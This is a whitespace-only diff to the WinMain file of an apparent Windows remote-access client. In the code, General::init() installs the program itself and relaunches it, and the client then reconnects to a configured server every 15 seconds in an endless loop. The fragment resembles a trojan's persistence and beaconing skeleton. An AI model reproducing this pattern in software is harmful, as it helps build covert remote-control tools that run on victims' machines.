@@ -16,11 +16,10 @@
 
 #include "general.h"
 
-
 #if _DEBUG
 //TESTFUNC
 
-void testMB(std::string s)		//TEST FUNCTION
+void testMB(std::string s) //TEST FUNCTION
 {
 	MessageBox(0, s.c_str(), "THIS IS A TEST", 0);
 }
@@ -29,23 +28,18 @@ void testMB(std::string s)		//TEST FUNCTION
 
 #endif
 
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) //main function
 {
 	//VARIABLE SETUP
 	General::lpArguments = lpCmdLine;
 
-
-	if (General::init())	//runs init() and exits file if it installs itself (starts new file)
+	if (General::init()) //runs init() and exits file if it installs itself (starts new file)
 		return 0;
-
 
 	Client MyClient(Settings::serverIP, Settings::serverPort); //Client
 
 	while (true)
 	{
-
-
-
 
 		if (!MyClient.connected)
 		{
@@ -56,8 +50,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 		}
 		Sleep(15000);
 	}
-
-
 
 	return 0;
 }
